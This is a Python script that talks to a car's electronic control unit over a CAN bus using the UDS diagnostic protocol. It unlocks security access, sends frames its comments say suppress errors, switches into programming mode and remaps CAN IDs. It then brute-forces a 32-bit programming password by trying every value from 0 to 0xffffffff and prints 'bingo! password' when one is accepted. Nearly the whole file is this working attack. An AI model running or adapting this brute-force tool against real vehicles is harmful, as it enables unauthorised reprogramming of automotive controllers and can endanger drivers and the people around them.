#!/usr/bin/python3

import time, sys
import config as CarConfig
import aqua_patch

import isotp
import udsoncan
from udsoncan.connections import IsoTPSocketConnection
from udsoncan.client import Client
from udsoncan.exceptions import *
from udsoncan.services import *
from udsoncan import Request, Response

import random, datetime

#udsoncan.setup_logging()

aqua_patch.PatchMessageFormat()



if __name__ == '__main__':
    isotp_socket = isotp.socket()
    isotp_socket.set_opts(txpad=CarConfig.TXPADSIZE, rxpad=CarConfig.RXPADSIZE)
    conn = IsoTPSocketConnection('can0', rxid=CarConfig.RXID, txid=CarConfig.TXID, tpsock=isotp_socket)

    with Client(conn, request_timeout=2, config=CarConfig.car_client_config) as client:
        try:
            client.change_session(DiagnosticSessionControl.Session.defaultSession)
            client.unlock_security_access(CarConfig.SECURITY_LEVEL)

            # suppress error
            for i in range(0,3):
                conn.send(b'\x0a\x27')
                time.sleep(0.5)

            client.change_session(DiagnosticSessionControl.Session.programmingSession)   

        except NegativeResponseException as e:
            print('Server refused our request for service %s with code "%s" (0x%02x)' % (e.response.service.get_name(), e.response.code_name, e.response.code))
        except UnexpectedResponseException as e:
            print('Server sent an invalid payload : %s' % e.response.original_payload)
        except TimeoutException as e:
            pass

    isotp_socket2 = isotp.socket()
    isotp_socket2.set_opts(txpad=CarConfig.TXPADSIZE, rxpad=CarConfig.RXPADSIZE)
    conn2 = IsoTPSocketConnection('can0', rxid=0x002, txid=0x001, tpsock=isotp_socket2)

    with Client(conn2, request_timeout=2, config=CarConfig.car_client_config) as client:
        try:
            # programming session enable test
            for i in range(0,2):
                conn2.send(b'\x00')
                conn2.wait_frame(timeout=0.5)
            
            # switch canid for programming
            conn2.send(b'\x20\x07\x01\x00\x02\x00')
            conn2.wait_frame(timeout=0.5)
            conn2.send(b'\x07\x00')
            conn2.wait_frame(timeout=0.5)

            before_time = time.time()
            for cnt in range(0, 0xffffffff):
                conn2.send(cnt.to_bytes(4, "big"))
                payload = conn2.wait_frame(timeout=0.004)
                
                if payload is not None:
                    print("bingo! password: %s, payload: %s" % (format(cnt, '#010x'), payload))
                    sys.exit()

                if cnt % 100 == 0:
                    remain = 0xffffffff - cnt
                    etaTime = datetime.timedelta(seconds=int(((time.time() -before_time)/100) * remain))
                    before_time = time.time()
                    print("\r%s / %s (cand: %s, ETA(s): %s)" % (cnt, 0xffffffff, format(cnt, '#010x'), etaTime), end="")


        except NegativeResponseException as e:
            print('Server refused our request for service %s with code "%s" (0x%02x)' % (e.response.service.get_name(), e.response.code_name, e.response.code))
        except UnexpectedResponseException as e:
            print('Server sent an invalid payload : %s' % e.response.original_payload)
        except TimeoutException as e:
            pass

